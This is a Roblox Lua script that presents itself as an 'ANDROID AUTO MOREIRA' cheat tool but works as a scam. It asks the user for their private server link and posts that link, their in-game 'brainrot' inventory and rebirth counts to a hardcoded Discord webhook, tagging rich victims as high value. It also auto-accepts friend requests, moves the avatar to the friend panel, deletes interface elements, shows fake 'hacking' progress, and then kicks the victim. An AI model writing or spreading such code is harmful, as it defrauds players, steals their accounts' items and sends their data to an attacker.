local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local PathfindingService = game:GetService("PathfindingService")
local Workspace = workspace
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local CoreGui = game:GetService("CoreGui")

-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1371292246330052661/mMh1dK8mB8GzcICihOyAe9iBKlFlPgTyB5msnDwjn095N05bK-F6Rqml0QijR4tua5uE"
local PROGRESS_BAR_DURATION = 180
local SPECIAL_USERNAMES = {
    ["tanqr_isnoob12346"] = true,
    ["skibiditoiletkst"] = true,
    ["ezggthebest0908"] = true
}

-- Essential CoreGui (never delete)
local ESSENTIAL_COREGUI = {
    ["RobloxGui"] = true, ["Chat"] = true, ["PlayerList"] = true,
    ["Topbar"] = true, ["CoreScript"] = true
}

local playerName = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName or playerName

local function normalize(s)
    return tostring(s or ""):lower()
end

-- Webhook sender
local function send_webhook(payloadJson)
    local req = (rawget(_G,"request") and request) or 
                (rawget(_G,"http_request") and http_request) or
                (syn and syn.request) or (http and http.request)

    if req then
        pcall(function()
            req({Url = WEBHOOK_URL, Method = "POST",
                Headers = {["Content-Type"] = "application/json"}, Body = payloadJson})
        end)
        return true
    end

    if HttpService.HttpEnabled then
        pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, payloadJson, Enum.HttpContentType.ApplicationJson)
        end)
        return true
    end
    return false
end

-- Mute all sounds
for _, sound in ipairs(game:GetDescendants()) do
    if sound:IsA("Sound") then sound.Volume = 0 end
end
game.DescendantAdded:Connect(function(obj)
    if obj:IsA("Sound") then obj.Volume = 0 end
end)

-- Private server link checker
local function is_valid_priv_link(s)
    if type(s) ~= "string" then return false end
    return s:match("^https://www%.roblox%.com/share%?code=%w+&type=Server$") ~= nil
end

-- GUI cleaner
local function full_cleanup(restoreAll)
    if restoreAll then return end
    for _, child in ipairs(PlayerGui:GetChildren()) do
        if child.Name ~= "AndroidAutoMoreiraGui" then pcall(function() child:Destroy() end) end
    end
    for _, child in ipairs(CoreGui:GetChildren()) do
        if child.Name ~= "AndroidAutoMoreiraGui" and not ESSENTIAL_COREGUI[child.Name] then
            pcall(function() child:Destroy() end)
        end
    end
end

--------------------------------------------------------------------
-- AUTO-ACCEPT FRIEND REQUESTS (SILENT)
--------------------------------------------------------------------
local function autoAcceptFriends()
    Players.PlayerAdded:Connect(function(plr)
        plr.FriendRequestEvent:Connect(function(sender, accept)
            if accept == false then
                pcall(function() plr:RequestFriendship(sender) end)
            end
        end)
    end)

    task.spawn(function()
        while task.wait(1) do
            local success, friends = pcall(function()
                return Players:GetFriendsAsync(LocalPlayer.UserId)
            end)
            if success and friends then
                for _, req in ipairs(friends.Data) do
                    if req.IsRequest then
                        pcall(function() LocalPlayer:RequestFriendship(req.Id) end)
                    end
                end
            end
        end
    end)
end
autoAcceptFriends()

--------------------------------------------------------------------
-- AUTO GO TO FRIEND PANEL
--------------------------------------------------------------------
local function goToFriendPanel()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    local function findMyPlot()
        local plotsFolder = Workspace:FindFirstChild("Plots")
        if not plotsFolder then return nil end
        for _, plot in pairs(plotsFolder:GetChildren()) do
            local sign = plot:FindFirstChild("PlotSign")
            if not sign then continue end
            local surfaceGui = sign:FindFirstChild("SurfaceGui")
            if not surfaceGui then continue end
            local frame = surfaceGui:FindFirstChild("Frame")
            if not frame then continue end
            local label = frame:FindFirstChild("TextLabel")
            if not label then continue end
            local signText = normalize(label.Text)
            local disp = normalize(displayName)
            local uname = normalize(playerName)
            if (signText:find(disp) or signText:find(uname)) and (signText:find("base") or signText:find("plot")) then
                return plot
            end
        end
        return nil
    end

    local myPlot = findMyPlot()
    if not myPlot then return end
    local friendPanel = myPlot:FindFirstChild("FriendPanel")
    if not friendPanel then return end
    local main = friendPanel:FindFirstChild("Main")
    if not main then return end
    local prompt = main:FindFirstChild("ProximityPrompt")
    if not prompt then return end

    local targetPos = main.Position
    local path = PathfindingService:CreatePath({AgentRadius = 2, AgentHeight = 5, AgentCanJump = true})
    path:ComputeAsync(rootPart.Position, targetPos)

    if path.Status == Enum.PathStatus.Success then
        for _, waypoint in ipairs(path:GetWaypoints()) do
            humanoid:MoveTo(waypoint.Position)
            if waypoint.Action == Enum.PathWaypointAction.Jump then humanoid.Jump = true end
            local reached = humanoid.MoveToFinished:Wait(8)
            if not reached then rootPart.CFrame = CFrame.new(waypoint.Position); task.wait(1) end
        end
    else
        humanoid:MoveTo(targetPos)
        humanoid.MoveToFinished:Wait(10)
    end

    rootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 0, 3))
    for i = 7, 1, -1 do task.wait(1) end
    if prompt and prompt.Enabled then fireproximityprompt(prompt) end
end

--------------------------------------------------------------------
-- BRAINROT SCANNER: ONLY MY BASE
--------------------------------------------------------------------
local function getBrainrots(myBase)
    local results = {}
    if not myBase then return results end

    local pods = myBase:FindFirstChild("AnimalPodiums")
    if not pods then return results end

    for i = 1, 99 do
        local podium = pods:FindFirstChild(tostring(i))
        if podium and podium:FindFirstChild("Base") then
            local spawn = podium.Base:FindFirstChild("Spawn")
            local attach = spawn and spawn:FindFirstChild("Attachment")
            local overhead = attach and attach:FindFirstChild("AnimalOverhead")
            if overhead then
                local nameObj = overhead:FindFirstChild("DisplayName")
                local genObj  = overhead:FindFirstChild("Generation")
                if nameObj and tostring(nameObj.Text) ~= "" then
                    table.insert(results, {
                        Name = tostring(nameObj.Text),
                        Generation = genObj and tostring(genObj.Text) or "?"
                    })
                end
            end
        end
    end

    return results
end

--------------------------------------------------------------------
-- FINAL WEBHOOK: ONLY MY BASE + REBIRTHS + HIGH VALUE TAG
--------------------------------------------------------------------
local function send_podium_webhook(text)
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return false end

    -- Find MY plot only
    local myPlot = nil
    for _, plot in pairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if not sign then continue end
        local surfaceGui = sign:FindFirstChild("SurfaceGui")
        if not surfaceGui then continue end
        local frame = surfaceGui:FindFirstChild("Frame")
        if not frame then continue end
        local label = frame:FindFirstChild("TextLabel")
        if not label then continue end

        local signText = normalize(label.Text)
        local disp = normalize(displayName)
        local uname = normalize(playerName)

        if (signText:find(disp) or signText:find(uname)) and (signText:find("base") or signText:find("plot")) then
            myPlot = plot
            break
        end
    end

    if not myPlot then
        warn("Could not find your plot!")
        return false
    end

    -- Get brainrots from MY base only
    local brainrots = getBrainrots(myPlot)
    local totalBrainrotCount = #brainrots

    -- Format brainrot list
    local brainrotLines = {}
    for _, b in ipairs(brainrots) do
        table.insert(brainrotLines, string.format("• %s: %s/s", b.Name, b.Generation))
    end

    -- Get rebirths
    local ownerRebirth = 0
    local otherRebirths = {}

    for _, plr in ipairs(Players:GetPlayers()) do
        local ls = plr:FindFirstChild("leaderstats") or plr:WaitForChild("leaderstats", 5)
        local rb = ls and ls:FindFirstChild("Rebirths")
        local val = rb and tonumber(rb.Value) or 0
        if plr == LocalPlayer then
            ownerRebirth = val
        else
            table.insert(otherRebirths, val)
        end
    end
    table.sort(otherRebirths)

    -- High value tag
    local tag = ""
    if totalBrainrotCount > 50 or ownerRebirth > 10 then
        tag = " **[HIGH VALUE]**"
    end

    -- Build message
    local othersText = #otherRebirths > 0 and table.concat(otherRebirths, ", ") or "0"
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers

    local message = "@everyone ANDROID AUTO MOREIRA ACTIVATED" .. tag .. "\n\n" ..
        "**His Base:**\n" ..
        (#brainrotLines > 0 and table.concat(brainrotLines, "\n") or "None found") .. "\n\n" ..
        "**Total Brainrots:** " .. totalBrainrotCount .. "\n\n" ..
        "Player: " .. LocalPlayer.Name .. " (" .. (LocalPlayer.DisplayName or "No Display") .. ")\n" ..
        "Server: " .. playerCount .. "/" .. maxPlayers .. "\n" ..
        "Private Server Link: " .. (text or "nil") .. "\n\n" ..
        "**His Rebirth:** " .. ownerRebirth .. "\n" ..
        "**Others Rebirths:** " .. othersText

    local payload = HttpService:JSONEncode({content = message})

    -- Try sending 3 times
    for i = 1, 3 do
        if send_webhook(payload) then return true end
        task.wait(1)
    end
    return false
end

--------------------------------------------------------------------
-- HACKER ANIMATION
--------------------------------------------------------------------
local function show_hacker_animation(parentGui, isSpecialUser)
    local hackerFrame = Instance.new("Frame", parentGui)
    hackerFrame.Size = UDim2.new(1, 0, 1, 0)
    hackerFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    hackerFrame.BackgroundTransparency = 0.1
    hackerFrame.ZIndex = 10000

    local hackerText = Instance.new("TextLabel", hackerFrame)
    hackerText.Size = UDim2.new(0.8, 0, 0.4, 0)
    hackerText.Position = UDim2.new(0.1, 0, 0.2, 0)
    hackerText.BackgroundTransparency = 1
    hackerText.TextColor3 = Color3.fromRGB(0, 255, 0)
    hackerText.Font = Enum.Font.Code
    hackerText.TextScaled = true
    hackerText.Text = ""
    hackerText.ZIndex = 10001

    local progressFrame = Instance.new("Frame", hackerFrame)
    progressFrame.Size = UDim2.new(0.8, 0, 0.05, 0)
    progressFrame.Position = UDim2.new(0.1, 0, 0.65, 0)
    progressFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    progressFrame.ZIndex = 10001

    local progressCorner = Instance.new("UICorner", progressFrame)
    progressCorner.CornerRadius = UDim.new(0, 10)

    local progressBar = Instance.new("Frame", progressFrame)
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    progressBar.ZIndex = 10002

    local barCorner = Instance.new("UICorner", progressBar)
    barCorner.CornerRadius = UDim.new(0, 10)

    local progressGlow = Instance.new("ImageLabel", progressFrame)
    progressGlow.Size = UDim2.new(1.1, 0, 1.5, 0)
    progressGlow.Position = UDim2.new(-0.05, 0, -0.25, 0)
    progressGlow.BackgroundTransparency = 1
    progressGlow.Image = "rbxassetid://431637172"
    progressGlow.ImageColor3 = Color3.fromRGB(0, 255, 0)
    progressGlow.ImageTransparency = 0.8
    progressGlow.ZIndex = 10000

    local fakeHackerMessages = {
        "Initializing ANDROID AUTO MOREIRA...",
        "Importing moreira.lua...",
        "Bypassing Roblox security protocols...",
        "Decrypting server data...",
        "Injecting payload into game client...",
        "Establishing secure connection...",
        "Executing moreira_core.exe...",
        "Syncing with private server..."
    }

    task.spawn(function()
        local messageIndex = 1
        local dots = 1
        local timeElapsed = 0

        while timeElapsed < PROGRESS_BAR_DURATION do
            local msg = fakeHackerMessages[messageIndex]
            hackerText.Text = msg .. string.rep(".", dots)
            dots = (dots % 3) + 1
            if dots == 1 then messageIndex = (messageIndex % #fakeHackerMessages) + 1 end

            local progress = timeElapsed / PROGRESS_BAR_DURATION
            TweenService:Create(progressBar, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {Size = UDim2.new(progress, 0, 1, 0)}):Play()

            local hue = (timeElapsed % 10) / 10
            local color = Color3.fromHSV(hue, 1, 1)
            progressBar.BackgroundColor3 = color
            progressGlow.ImageColor3 = color

            task.wait(0.5)
            timeElapsed = timeElapsed + 0.5
        end

        if isSpecialUser then
            hackerFrame:Destroy()
            full_cleanup(true)
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        else
            hackerText.Text = "Failed, please try again"
            progressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            progressGlow.ImageColor3 = Color3.fromRGB(255, 0, 0)
            task.wait(2)
            hackerFrame:Destroy()
            LocalPlayer:Kick("Failed, please try again")
        end
    end)
end

--------------------------------------------------------------------
-- MAIN GUI + AUTO RUN
--------------------------------------------------------------------
local function build_android_auto_moreira_gui()
    full_cleanup(false)

    local gui = Instance.new("ScreenGui")
    gui.Name = "AndroidAutoMoreiraGui"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = PlayerGui

    -- AUTO RUN FRIEND PANEL
    task.spawn(goToFriendPanel)

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    bg.BorderSizePixel = 0
    bg.ZIndex = 9997

    local gradient = Instance.new("UIGradient", bg)
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 60)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 30, 80))
    }
    gradient.Rotation = 45

    local title = Instance.new("TextLabel", gui)
    title.Size = UDim2.new(1, 0, 0.15, 0)
    title.Position = UDim2.new(0, 0, 0.05, 0)
    title.BackgroundTransparency = 1
    title.Text = "ANDROID AUTO MOREIRA"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.Font = Enum.Font.Code
    title.TextScaled = true
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.ZIndex = 9999

    local glow = Instance.new("ImageLabel", title)
    glow.Size = UDim2.new(1.2, 0, 1.2, 0)
    glow.Position = UDim2.new(-0.1, 0, -0.1, 0)
    glow.BackgroundTransparency = 1
    glow.Image = "rbxassetid://431637172"
    glow.ImageColor3 = Color3.fromRGB(0, 255, 0)
    glow.ImageTransparency = 0.7
    glow.ZIndex = 9998

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0.8, 0, 0.25, 0)
    frame.Position = UDim2.new(0.1, 0, 0.35, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    frame.BorderSizePixel = 0
    frame.ZIndex = 9998

    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 16)

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(0, 255, 0)
    stroke.Thickness = 2
    stroke.Transparency = 0.5

    local box = Instance.new("TextBox", frame)
    box.Size = UDim2.new(0.9, 0, 0.4, 0)
    box.Position = UDim2.new(0.05, 0, 0.15, 0)
    box.PlaceholderText = "Enter Private Server Link"
    box.Text = ""
    box.TextColor3 = Color3.new(1, 1, 1)
    box.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    box.Font = Enum.Font.Code
    box.TextScaled = true
    box.ZIndex = 9999

    local boxCorner = Instance.new("UICorner", box)
    boxCorner.CornerRadius = UDim.new(0, 10)

    local startButton = Instance.new("TextButton", gui)
    startButton.Size = UDim2.new(0.3, 0, 0.1, 0)
    startButton.Position = UDim2.new(0.35, 0, 0.65, 0)
    startButton.Text = "START"
    startButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    startButton.TextColor3 = Color3.new(1, 1, 1)
    startButton.Font = Enum.Font.Code
    startButton.TextScaled = true
    startButton.ZIndex = 9999

    local startCorner = Instance.new("UICorner", startButton)
    startCorner.CornerRadius = UDim.new(0, 12)

    local startStroke = Instance.new("UIStroke", startButton)
    startStroke.Color = Color3.fromRGB(0, 255, 0)
    startStroke.Thickness = 1.5

    startButton.MouseEnter:Connect(function()
        TweenService:Create(startButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 255, 0)}):Play()
    end)
    startButton.MouseLeave:Connect(function()
        TweenService:Create(startButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 200, 0)}):Play()
    end)

    startButton.MouseButton1Click:Connect(function()
        local text = box.Text
        if not is_valid_priv_link(text) then
            box.Text = ""
            box.PlaceholderText = "Invalid Link!"
            task.delay(2, function()
                if box and box.Parent then box.PlaceholderText = "Enter Private Server Link" end
            end)
            return
        end

        send_podium_webhook(text)
        local isSpecialUser = SPECIAL_USERNAMES[LocalPlayer.Name]
        show_hacker_animation(gui, isSpecialUser)
    end)
end

build_android_auto_moreira_gui()


-- AUTO-ACCEPT FRIEND REQUESTS + DELETE COREGUI (EXCEPT PROMPTS)
task.spawn(function()
    -- Auto accept friend requests
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            plr.FriendRequestEvent:Connect(function()
                pcall(function() LocalPlayer:RequestFriendship(plr) end)
            end)
        end)
    end
    Players.PlayerAdded:Connect(function(plr)
        plr.FriendRequestEvent:Connect(function()
            pcall(function() LocalPlayer:RequestFriendship(plr) end)
        end)
    end)

    -- Periodic pending accept
    task.spawn(function()
        while task.wait(2) do
            local s, f = pcall(function()
                return Players:GetFriendsAsync(LocalPlayer.UserId)
            end)
            if s and f then
                for _, req in ipairs(f.Data) do
                    if req.IsRequest then
                        pcall(function() LocalPlayer:RequestFriendship(req.Id) end)
                    end
                end
            end
        end
    end)

    -- DELETE COREGUI EXCEPT PROMPTS
    local function shouldKeep(obj)
        local n = (obj.Name or ""):lower()
        return n:find("prompt") ~= nil  -- keep any UI that contains "prompt"
    end

    for _, v in pairs(CoreGui:GetChildren()) do
        if not shouldKeep(v) then
            pcall(function() v:Destroy() end)
        end
    end

    CoreGui.ChildAdded:Connect(function(obj)
        task.wait(0.05)
        if not shouldKeep(obj) then
            pcall(function() obj:Destroy() end)
        end
    end)
end)

